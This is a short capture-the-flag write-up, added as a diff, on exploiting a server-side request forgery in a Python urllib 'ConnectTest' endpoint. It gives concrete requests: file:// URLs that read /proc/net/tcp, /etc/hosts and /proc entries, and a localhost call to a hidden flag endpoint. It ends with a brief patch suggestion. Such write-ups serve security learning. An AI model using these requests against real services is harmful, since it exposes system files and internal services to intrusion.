@@ -1,0 +1,53 @@
+use https://webhook.site/
+know it uses urllib by reading headers
+# Ref: https://vsociety.medium.com/cve-2023-24329-bypassing-url-blackslisting-using-blank-in-python-urllib-library-ee438679351d
+# Ref: https://gist.github.com/YSc21/e5471285145cc5d34fe53c7d67a3d8f3
+
+use `file://` protocol of `urllib`, read
+# http://eci-2zefwhpiphrzqnvc9e49.cloudeci1.ichunqiu.com:8888/api/ConnectTest?url=file:///proc/net/tcp
+# http://eci-2zefwhpiphrzqnvc9e49.cloudeci1.ichunqiu.com:8888/api/ConnectTest?url=file:///etc/hosts
+/proc/net/tcp
+
+by using this route
+```
+/api/ConnectTest?url=file://
+```
+
+got opened ports, found a opened port 55555 which is a localhost process, has hint "You found me."
+
+check
+/proc/self/status
+found current process pid is 15
+
+by brute force checks 
+/proc/13/status got another python process
+```
+Name: python3
+Umask: 0022
+State: S (sleeping)
+Tgid: 13
+Ngid: 0
+Pid: 13
+PPid: 1
+```
+
+use /proc/13/cmdline got it's entrypoint:
+```
+python3 /flag_server/main.py
+```
+
+by reading `/flag_server/main.py`
+got flag endpoint info
+```
+@app.route('/api/GetFlag', methods=["GET", 'POST'])
+def ConnectTest():
+return os.popen('cat /flag').read()
+```
+
+then access
+```
+/api/ConnectTest?url=http://localhost:55555/api/GetFlag
+```
+got the flag
+
+patch is easy, don't let people access localhost and file:// is enough.
